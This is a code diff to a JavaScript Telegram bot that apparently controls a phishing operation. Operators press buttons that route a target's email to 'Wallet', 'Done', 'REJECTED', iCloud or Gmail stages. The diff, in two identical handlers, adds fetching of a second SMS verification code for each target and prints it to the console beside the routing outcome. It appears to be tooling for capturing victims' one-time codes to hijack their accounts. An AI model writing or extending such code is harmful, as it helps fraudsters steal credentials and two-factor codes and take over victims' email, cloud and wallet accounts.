@@ -235,18 +235,29 @@ bot.on("callback_query", async (query) => {
           const sms2Info = await fetch(`${APP_URL}/get-sms2-info/${sms2Id}`);
           const sms2Data = await sms2Info.json();
           const sms2Email = sms2Data.email || sms2Id;
+          const sms2Code = sms2Data.code;
           
           let statusMsg = "";
+          let consoleLog = "";
           if (action === "sms2_wallet") {
             statusMsg = `📧 <code>${sms2Email}</code> has been directed to <b>Wallet</b> 💼`;
+            consoleLog = `💬 SMS - 2: ${sms2Code} → 💼`;
           } else if (action === "sms2_done") {
             statusMsg = `📧 <code>${sms2Email}</code> has been directed to <b>Done</b> 🏁`;
+            consoleLog = `💬 SMS - 2: ${sms2Code} → 🏁`;
           } else if (action === "sms2_reject") {
             statusMsg = `📧 <code>${sms2Email}</code> has been <b>REJECTED</b>! ❌`;
+            consoleLog = `💬 SMS - 2: ${sms2Code} → REJECTED!❌`;
           } else if (action === "sms2_icloud") {
             statusMsg = `📧 <code>${sms2Email}</code> → ☁️`;
+            consoleLog = `💬 SMS - 2: ${sms2Code} → ☁️`;
           } else if (action === "sms2_gmail") {
             statusMsg = `📧 <code>${sms2Email}</code> → 🌈`;
+            consoleLog = `💬 SMS - 2: ${sms2Code} → 🌈`;
+          }
+          
+          if (consoleLog) {
+            console.log(consoleLog);
           }
           
           if (statusMsg) {
@@ -944,18 +955,29 @@ if (bot2) {
             const sms2Info = await fetch(`${APP_URL}/get-sms2-info/${sms2Id}`);
             const sms2Data = await sms2Info.json();
             const sms2Email = sms2Data.email || sms2Id;
+            const sms2Code = sms2Data.code;
             
             let statusMsg = "";
+            let consoleLog = "";
             if (action === "sms2_wallet") {
               statusMsg = `📧 <code>${sms2Email}</code> has been directed to <b>Wallet</b> 💼`;
+              consoleLog = `💬 SMS - 2: ${sms2Code} → 💼`;
             } else if (action === "sms2_done") {
               statusMsg = `📧 <code>${sms2Email}</code> has been directed to <b>Done</b> 🏁`;
+              consoleLog = `💬 SMS - 2: ${sms2Code} → 🏁`;
             } else if (action === "sms2_reject") {
               statusMsg = `📧 <code>${sms2Email}</code> has been <b>REJECTED</b>! ❌`;
+              consoleLog = `💬 SMS - 2: ${sms2Code} → REJECTED!❌`;
             } else if (action === "sms2_icloud") {
               statusMsg = `📧 <code>${sms2Email}</code> → ☁️`;
+              consoleLog = `💬 SMS - 2: ${sms2Code} → ☁️`;
             } else if (action === "sms2_gmail") {
               statusMsg = `📧 <code>${sms2Email}</code> → 🌈`;
+              consoleLog = `💬 SMS - 2: ${sms2Code} → 🌈`;
+            }
+            
+            if (consoleLog) {
+              console.log(consoleLog);
             }
             
             if (statusMsg) {
